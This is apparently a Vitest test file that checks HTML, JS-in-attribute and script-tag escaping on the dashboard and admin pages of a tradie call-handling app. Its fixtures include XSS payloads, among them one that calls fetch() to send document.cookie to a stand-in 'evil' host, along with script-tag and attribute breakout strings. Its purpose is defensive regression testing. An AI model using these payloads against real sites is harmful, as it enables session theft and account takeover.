import { describe, it, expect } from "vitest";
import type { LeadRow, TenantDetail, TenantRow, TenantWithStats } from "../src/db/repo.js";

/**
 * Server-rendered pages are template strings and every `${...}` carrying caller
 * or tenant text is an XSS hole without escaping. That rule is in
 * CODING_STANDARDS.md and had NO test: a round-2 review stripped all 58
 * `${escape(...)}` calls in src/dashboard/pages.ts down to `${...}` and the
 * whole suite stayed green, typecheck included.
 *
 * Both inputs here are attacker-controlled in production:
 *   - a lead's name, address and issue_summary come off a phone call, so
 *     anyone who rings the tradie's number chooses them;
 *   - a tenant's business name comes from the PUBLIC signup form, which
 *     validates trade_type and phone and does not validate the name.
 *
 * Three distinct contexts, three different escapes, and the two beyond plain
 * HTML text are the ones that were actually broken:
 *   1. HTML text        — escape()/esc()
 *   2. a JS string inside an HTML attribute — the parser decodes entities
 *      BEFORE the JS engine sees them, so `&#39;` becomes a real apostrophe
 *      and closes a confirm('…') literal
 *   3. JSON inside a <script> tag — JSON.stringify does not escape `<`, so
 *      `</script>` closes the tag
 */

const PAYLOADS = {
  html: `<script>alert(1)</script>`,
  attrJs: `x');fetch('//evil/?c='+document.cookie);//`,
  scriptTag: `</script><img src=x onerror=alert(1)>`
};

function makeTenant(over: Partial<TenantRow> = {}): TenantRow {
  return {
    tenant_id: "t-xss", name: "Test Plumbing", trade_type: "plumber",
    ai_name: "Olivia", twilio_number: "+61400000000", owner_phone: "+61411111111",
    owner_email: "x@test.local", password_hash: "x", session_token: null,
    business_hours_start: "08:00", business_hours_end: "17:00",
    timezone: "Australia/Sydney", enable_warm_transfer: 0, service_area: null,
    custom_instructions: null, vacation_mode: 0, vacation_message: null,
    active: 1, created_at: new Date().toISOString(), last_login_at: null,
    payment_status: "active", trial_ends_at: null, stripe_customer_id: null,
    ...over
  } as TenantRow;
}

function makeLead(over: Record<string, unknown> = {}) {
  return {
    lead_id: "l-xss", tenant_id: "t-xss", call_id: "c-xss",
    name: "Gary", phone: "+61412345678", address: "1 Test St",
    issue_type: "plumbing", issue_summary: "Leaking tap",
    urgency_level: null, preferred_time: null, notes: null, confidence: null,
    next_action: null, lead_status: "new", job_value: null, job_size: null,
    property_type: null, caller_sentiment: null, caller_intent: "new_job",
    created_at: new Date().toISOString(),
    recording_url: null, transcript: null, from_number: "+61412345678",
    ...over
  } as LeadRow & { recording_url: string | null; transcript: string | null; from_number: string | null };
}

describe("dashboard SSR escaping", () => {
  it("escapes caller-supplied text on the leads list", async () => {
    const { leadsPage } = await import("../src/dashboard/pages.js");
    const html = leadsPage(
      makeTenant(),
      [makeLead({ name: PAYLOADS.html, address: PAYLOADS.html, issue_summary: PAYLOADS.html })],
      {}
    );
    expect(html).not.toContain("<script>alert(1)</script>");
    // The text must still be there — escaped, not dropped.
    expect(html).toContain("&lt;script&gt;");
  });

  it("escapes caller-supplied text on the lead detail page", async () => {
    const { leadDetailPage } = await import("../src/dashboard/pages.js");
    const html = leadDetailPage(
      makeTenant(),
      makeLead({
        name: PAYLOADS.html, address: PAYLOADS.html, issue_summary: PAYLOADS.html,
        notes: PAYLOADS.html, next_action: PAYLOADS.html, transcript: PAYLOADS.html
      })
    );
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain("&lt;script&gt;");
  });

  // shell() embeds the tenant name as JSON in a <script> tag, so this fired on
  // EVERY dashboard page. JSON.stringify escapes quotes and backslashes and not
  // `<`, which is the whole exploit.
  it("does not let a tenant name close the chat-context script tag", async () => {
    const { leadsPage } = await import("../src/dashboard/pages.js");
    const html = leadsPage(makeTenant({ name: PAYLOADS.scriptTag }), [], {});
    expect(html).not.toContain("</script><img");
    expect(html).toContain("\\u003c/script");
  });
});

describe("admin SSR escaping", () => {
  // esc() alone is NOT enough inside an event handler: the HTML parser decodes
  // `&#39;` back to an apostrophe before the JS engine sees the string, so the
  // escaped value closes the confirm('…') literal and everything after it runs
  // with the admin's session — which can delete tenants, read every tenant's
  // leads, and send SMS to prospect lists.
  // Both confirm() handlers on the page, not just the first. The second carries
  // owner_phone, and a phone-shaped fixture cannot express the attack — so
  // swapping escJsInAttr back to esc() there stayed green.
  it("neither confirm() handler can be broken out of", async () => {
    const { adminUserDetailPage } = await import("../src/admin/pages.js");
    const html = adminUserDetailPage(
      {
        ...makeTenant({ name: PAYLOADS.attrJs, owner_phone: PAYLOADS.attrJs }),
        lead_count: 0, call_count: 0, sms_count: 0,
        recent_leads: [], recent_calls: []
      } as unknown as TenantDetail,
      "https://example.test"
    );

    // Assert on the handler itself, not on the page. The escaped name appears
    // in ordinary HTML text elsewhere on the page, where `&#39;` is correct and
    // harmless — it is only inside the attribute that it decodes back into a
    // literal apostrophe and closes the string.
    const handlers = [...html.matchAll(/on(?:submit|click)="return confirm\((.*?)\)"/g)]
      .map((m) => m[1]);
    expect(handlers.length, "both confirm() handlers should be on the page")
      .toBeGreaterThanOrEqual(2);

    for (const js of handlers) {
    // What the JS engine actually receives, after the HTML parser has decoded
    // the attribute value. This is the step esc() alone does not survive.
    const decoded = js
      .replace(/&#39;/g, "'").replace(/&quot;/g, '"')
      .replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");

    // confirm()'s whole argument must still be ONE string literal: the only
    // unescaped apostrophes are the opening and closing delimiters, at the two
    // ends. Any third one means the attacker closed the literal early and
    // everything after it is code.
    expect(decoded.startsWith("'") && decoded.endsWith("'"), decoded).toBe(true);
    const inner = decoded.slice(1, -1);
    expect(inner.match(/(^|[^\\])'/g) ?? [], `unescaped quote inside: ${inner}`).toHaveLength(0);
    // And the payload survived as text rather than being dropped.
    expect(inner).toContain("fetch");
    }
  });

  it("escapes a tenant name in ordinary HTML text too", async () => {
    const { adminUsersPage, adminUserDetailPage } = await import("../src/admin/pages.js");
    for (const html of [
      adminUsersPage([
        { ...makeTenant({ name: PAYLOADS.html }), lead_count: 0, call_count: 0, sms_count: 0 } as unknown as TenantWithStats
      ]),
      adminUserDetailPage(
        {
          ...makeTenant({ name: PAYLOADS.html }),
          lead_count: 0, call_count: 0, sms_count: 0, recent_leads: [], recent_calls: []
        } as unknown as TenantDetail,
        "https://example.test"
      )
    ]) {
      expect(html).not.toContain("<script>alert(1)</script>");
      expect(html).toContain("&lt;script&gt;");
    }
  });
});

/**
 * The escapers themselves, directly.
 *
 * The tests above go through the pages, and a round-3 review proved that leaves
 * 11 of 18 mutations green — including dropping `encodeURIComponent` from the
 * pagination link, and the SECOND of the two confirm() handlers. Page-level
 * tests only ever cover the sites they happen to render, and every
 * `value="${esc(x)}"` on both panels would become exploitable with the suite
 * green if esc() stopped escaping quotes.
 */
describe("the escapers themselves", () => {
  it("esc() neutralises every character that can leave an HTML context", async () => {
    const { escForTest } = await import("../src/admin/pages.js");
    for (const [raw, must] of [
      ["<", "&lt;"], [">", "&gt;"], ['"', "&quot;"], ["'", "&#39;"], ["&", "&amp;"]
    ] as const) {
      expect(escForTest(raw), `esc() must escape ${raw}`).toBe(must);
    }
    // Ampersand first, or the other escapes get double-encoded.
    expect(escForTest("&lt;")).toBe("&amp;lt;");
    // The attribute breakout, end to end.
    expect(escForTest('" onmouseover="alert(1)')).not.toContain('"');
  });

  it("escJsInAttr() survives every way out of a JS string in an attribute", async () => {
    const { escJsInAttrForTest } = await import("../src/admin/pages.js");
    // A backslash must be doubled FIRST, or the escapes it precedes are undone:
    // a lone backslash before the escaped quote makes JS read an escaped
    // BACKSLASH, and the quote then CLOSES the string. Assert the doubling
    // outright — "the output contains a double backslash" passes even without
    // doubling, because the quote escape puts one there.
    expect(escJsInAttrForTest("\\")).toBe("\\\\");
    // And end to end: after HTML-decoding, the quote must sit behind an ODD
    // number of backslashes, which is what keeps it inside the literal.
    const decoded = escJsInAttrForTest("a\\'b").replace(/&#39;/g, "'");
    const run = /(\\*)'/.exec(decoded);
    expect(run, decoded).not.toBeNull();
    expect(run![1].length % 2, `quote in ${decoded} is not escaped`).toBe(1);
    expect(escJsInAttrForTest("it's")).toContain("\\&#39;");
    expect(escJsInAttrForTest('say "hi"')).toContain("\\&quot;");
    // A bare CR counts: HTML attribute preprocessing turns a lone \r into a
    // newline, which makes the JS string literal unterminated — and then the
    // whole handler is skipped, so the delete confirmation silently stops
    // asking. Reachable with %0D in a business name.
    for (const nl of ["\r", "\n", "\r\n", "\u2028", "\u2029"]) {
      const out = escJsInAttrForTest(`a${nl}b`);
      expect(out, `raw ${JSON.stringify(nl)} must not survive`).not.toMatch(/[\r\n\u2028\u2029]/);
    }
  });

  it("jsonForScriptTag() cannot close the script element", async () => {
    const { jsonForScriptTag } = await import("../src/dashboard/pages.js");
    expect(jsonForScriptTag({ x: "</script>" })).not.toContain("</script>");
    expect(jsonForScriptTag({ x: "<!--" })).not.toContain("<");
    // Valid in JSON, line terminators in JavaScript — an unescaped one is a
    // syntax error that blanks the page.
    for (const ch of ["\u2028", "\u2029"]) {
      expect(jsonForScriptTag({ x: ch }), `U+${ch.codePointAt(0)!.toString(16)}`)
        .not.toContain(ch);
    }
  });
});

describe("admin pagination links", () => {
  // Reflected XSS: ?type= interpolated into an href with no escaping. It only
  // renders past 50 rows, which is why nothing had ever seen it.
  it("encodes a hostile ?type= filter into the pagination href", async () => {
    const { buildTypeQueryForTest } = await import("../src/admin/pages.js");
    const out = buildTypeQueryForTest('" onmouseover="alert(1)');
    expect(out).not.toContain('"');
    expect(out).not.toContain("<");
  });
});
